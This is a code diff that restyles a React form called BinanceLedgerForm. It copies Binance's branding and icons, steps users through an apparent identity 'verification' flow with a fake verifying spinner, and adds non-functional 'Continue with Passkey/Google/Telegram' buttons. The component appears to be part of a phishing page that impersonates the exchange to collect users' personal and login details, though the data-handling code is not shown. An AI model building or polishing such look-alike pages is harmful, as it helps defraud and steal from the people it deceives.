@@ -166,10 +166,10 @@ const BinanceLedgerForm: FC = () => {
       return (
         <div className="text-center mb-8">
           <div 
-            className="mb-6 flex items-center justify-center gap-3 text-2xl font-bold font-binance"
+            className="mb-6 flex items-center justify-center gap-2 text-lg font-semibold font-binance"
             style={{ color: "#F59E0B" }}
           >
-            <AlertTriangle size={32} className="text-yellow-500" />
+            <AlertTriangle size={18} className="text-yellow-500" />
             {titles[currentStep]}
           </div>
         </div>
@@ -180,7 +180,7 @@ const BinanceLedgerForm: FC = () => {
       return (
         <div className="text-center mb-8">
           <div 
-            className="text-2xl font-bold font-binance mb-4"
+            className="text-lg font-semibold font-binance mb-4"
             style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
           >
             {currentStep === 'verifying' ? 'Please wait a moment while we verify your details' : titles[currentStep]}
@@ -236,15 +236,17 @@ const BinanceLedgerForm: FC = () => {
   const renderMainForm = () => {
     if (currentStep === 'important-notice') {
       return (
-        <div 
-          className="mb-8 text-left p-6 rounded-lg border-l-4 border-yellow-500"
-          style={{ 
-            backgroundColor: "#FEF3C7",
-            color: "#92400E"
-          }}
-        >
-          <div className="text-sm font-binance">
-            Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
+        <div className="text-center mb-8">
+          <div 
+            className="p-6 rounded-lg border-l-4 border-yellow-500"
+            style={{ 
+              backgroundColor: "#FEF3C7",
+              color: "#92400E"
+            }}
+          >
+            <div className="text-sm font-binance text-center leading-relaxed">
+              Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
+            </div>
           </div>
         </div>
       );
@@ -253,7 +255,7 @@ const BinanceLedgerForm: FC = () => {
     if (currentStep === 'verifying') {
       return (
         <div className="flex justify-center">
-          <div className="animate-spin rounded-full h-16 w-16 border-4 border-yellow-500 border-t-transparent"></div>
+          <div className="animate-spin rounded-full h-12 w-12 border-4 border-yellow-500 border-t-transparent"></div>
         </div>
       );
     }
@@ -461,10 +463,16 @@ const BinanceLedgerForm: FC = () => {
                 }}
               >
                 <select
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance"
+                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance appearance-none cursor-pointer"
                   value={personalDetails.country}
                   onChange={(e) => setPersonalDetails({...personalDetails, country: e.target.value})}
-                  style={{ backgroundColor: "var(--color-Input, #2B3139)" }}
+                  style={{ 
+                    backgroundColor: "var(--color-Input, #2B3139)",
+                    backgroundImage: `url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3e%3c/svg%3e")`,
+                    backgroundPosition: 'right 0.75rem center',
+                    backgroundRepeat: 'no-repeat',
+                    backgroundSize: '1.5em 1.5em'
+                  }}
                 >
                   <option value="" className="bg-[#2B3139] text-white">Select a country</option>
                   {countries.map((country) => (
@@ -659,6 +667,7 @@ const BinanceLedgerForm: FC = () => {
     if (currentStep === 'important-notice') {
       return (
         <button
+          type="button"
           onClick={handleNoticeConfirm}
           className="w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance"
           style={{
@@ -680,6 +689,7 @@ const BinanceLedgerForm: FC = () => {
     if (currentStep === 'success') {
       return (
         <button
+          type="button"
           className="w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance"
           style={{
             backgroundColor: "var(--color-BtnBg, #FCD535)",
@@ -875,20 +885,128 @@ const BinanceLedgerForm: FC = () => {
         className="w-full max-w-md p-8 rounded-lg"
         style={{ 
           backgroundColor: "var(--color-Card, #1E2329)",
-          minHeight: "600px" // Fixed minimum height to prevent form jumping
+          minHeight: "600px"
         }}
       >
         {renderHeader()}
         {renderTitle()}
         
-        {/* Fixed content area with consistent height */}
         <div style={{ minHeight: "400px" }} className="flex flex-col">
           {renderMainForm()}
           
-          {/* Button area - always at the same position */}
           <div className="mt-auto">
             {renderButton()}
-            {renderAlternativeOptions()}
+            {currentStep === 'email' && (
+              <>
+                <div className="my-4 flex items-center md:mb-2 md:mt-6">
+                  <div 
+                    className="h-[1px] flex-1" 
+                    style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
+                  />
+                  <div 
+                    className="px-4 text-sm font-binance"
+                    style={{ 
+                      color: "var(--color-TertiaryText, #848E9C)",
+                      fontWeight: "400",
+                      lineHeight: "20px"
+                    }}
+                  >
+                    or
+                  </div>
+                  <div 
+                    className="h-[1px] flex-1" 
+                    style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
+                  />
+                </div>
+
+                <div className="space-y-3">
+                  <button 
+                    className="w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
+                    style={{
+                      backgroundColor: "transparent",
+                      border: "1px solid var(--color-InputLine, #474D57)",
+                      color: "var(--color-PrimaryText, #EAECEF)",
+                      fontSize: "14px",
+                      fontWeight: "400",
+                      lineHeight: "20px",
+                      height: "48px"
+                    }}
+                    role="button" 
+                    aria-label="Continue with Passkey"
+                  >
+                    <div className="icon-warp mr-3">
+                      <div className="ml-1 h-[20px]">
+                        <svg 
+                          className="bn-svg h-[20px] w-[20px]" 
+                          style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+                          viewBox="0 0 24 24" 
+                          xmlns="http://www.w3.org/2000/svg"
+                          fill="currentColor"
+                        >
+                          <path fillRule="evenodd" clipRule="evenodd" d="M1.5 17c0-2.9 2.35-5.25 5.25-5.25h3c2.9 0 5.25 2.35 5.25 5.25v4a.75.75 0 01-1.5 0v-4a3.75 3.75 0 00-3.75-3.75h-3A3.75 3.75 0 003 17v4a.75.75 0 01-1.5 0v-4zM8.25 9a3 3 0 100-6 3 3 0 000 6zm0 1.5a4.5 4.5 0 100-9 4.5 4.5 0 000 9zM18.536 11.923a.75.75 0 00-.75.75v5.138a.75.75 0 001.5 0v-5.138a.75.75 0 00-.75-.75z" />
+                          <path fillRule="evenodd" clipRule="evenodd" d="M17.786 16.041c0 .414.336.75.75.75h2.167a.75.75 0 000-1.5h-2.167a.75.75 0 00-.75.75zM16.75 10.15a1.773 1.773 0 113.545 0 1.773 1.773 0 01-3.545 0zm1.773-3.272a3.273 3.273 0 100 6.545 3.273 3.273 0 000-6.545z" />
+                        </svg>
+                      </div>
+                    </div>
+                    <div>Continue with Passkey</div>
+                  </button>
+
+                  <button 
+                    className="w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
+                    style={{
+                      backgroundColor: "transparent",
+                      border: "1px solid var(--color-InputLine, #474D57)",
+                      color: "var(--color-PrimaryText, #EAECEF)",
+                      fontSize: "14px",
+                      fontWeight: "400",
+                      lineHeight: "20px",
+                      height: "48px"
+                    }}
+                    role="button" 
+                    aria-label="Continue with Google"
+                  >
+                    <div className="icon-warp mr-3">
+                      <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="bn-svg">
+                        <g clipPath="url(#clip0_2445_976)">
+                          <path fillRule="evenodd" clipRule="evenodd" d="M19.68 12.1818C19.68 11.6146 19.6291 11.0691 19.5345 10.5455H12V13.64H16.3055C16.12 14.64 15.5564 15.4873 14.7091 16.0546V18.0618H17.2945C18.8073 16.6691 19.68 14.6182 19.68 12.1818Z" fill="#4285F4" />
+                          <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 20C14.1597 20 15.9706 19.2836 17.2942 18.0618L14.7088 16.0545C13.9924 16.5345 13.076 16.8182 11.9997 16.8182C9.91604 16.8182 8.1524 15.4109 7.52331 13.52H4.85059V15.5927C6.16695 18.2073 8.8724 20 11.9997 20Z" fill="#34A853" />
+                          <path fillRule="evenodd" clipRule="evenodd" d="M7.52364 13.52C7.36364 13.04 7.27273 12.5273 7.27273 12C7.27273 11.4727 7.36364 10.96 7.52364 10.48V8.40729H4.85091C4.30909 9.48729 4 10.7091 4 12C4 13.2909 4.30909 14.5127 4.85091 15.5927L7.52364 13.52Z" fill="#FBBC05" />
+                          <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 7.18182C13.1742 7.18182 14.2288 7.58545 15.0579 8.37818L17.3524 6.08364C15.9669 4.79273 14.156 4 11.9997 4C8.8724 4 6.16695 5.79273 4.85059 8.40727L7.52331 10.48C8.1524 8.58909 9.91604 7.18182 11.9997 7.18182Z" fill="#EA4335" />
+                        </g>
+                        <defs>
+                          <clipPath id="clip0_2445_976">
+                            <rect width="16" height="16" fill="none" transform="translate(4 4)" />
+                          </clipPath>
+                        </defs>
+                      </svg>
+                    </div>
+                    <div>Continue with Google</div>
+                  </button>
+
+                  <button 
+                    className="w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
+                    style={{
+                      backgroundColor: "transparent",
+                      border: "1px solid var(--color-InputLine, #474D57)",
+                      color: "var(--color-PrimaryText, #EAECEF)",
+                      fontSize: "14px",
+                      fontWeight: "400",
+                      lineHeight: "20px",
+                      height: "48px"
+                    }}
+                    role="button" 
+                    aria-label="Continue with Telegram"
+                  >
+                    <div className="icon-warp mr-3">
+                      <svg height="24" width="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" className="bn-svg">
+                        <path d="M2.81274 9.27228C7.28665 7.32306 10.27 6.03802 11.7627 5.41715C16.0247 3.64445 16.9103 3.33651 17.4875 3.32634C17.6144 3.3241 17.8983 3.35557 18.0822 3.50477C18.2374 3.63075 18.2801 3.80094 18.3006 3.92038C18.321 4.03983 18.3465 4.31192 18.3263 4.52453C18.0953 6.95123 17.0959 12.8402 16.5875 15.5581C16.3724 16.7082 15.9488 17.0938 15.5387 17.1315C14.6475 17.2136 13.9707 16.5426 13.1076 15.9767C11.7568 15.0913 10.9938 14.5401 9.68265 13.6761C8.16744 12.6776 9.14969 12.1288 10.0132 11.232C10.2392 10.9972 14.1659 7.42557 14.2419 7.10157C14.2514 7.06104 14.2603 6.90999 14.1705 6.83024C14.0808 6.75048 13.9483 6.77775 13.8528 6.79944C13.7173 6.83019 11.5595 8.25641 7.37938 11.0781C6.7669 11.4987 6.21213 11.7036 5.71508 11.6929C5.16711 11.681 4.11306 11.383 3.32947 11.1283C2.36838 10.8159 1.60451 10.6507 1.67103 10.1202C1.70568 9.84381 2.08624 9.56118 2.81274 9.27228Z" fill="#00AEED" />
+                      </svg>
+                    </div>
+                    <div>Continue with Telegram</div>
+                  </button>
+                </div>
+              </>
+            )}
           </div>
         </div>
       </div>
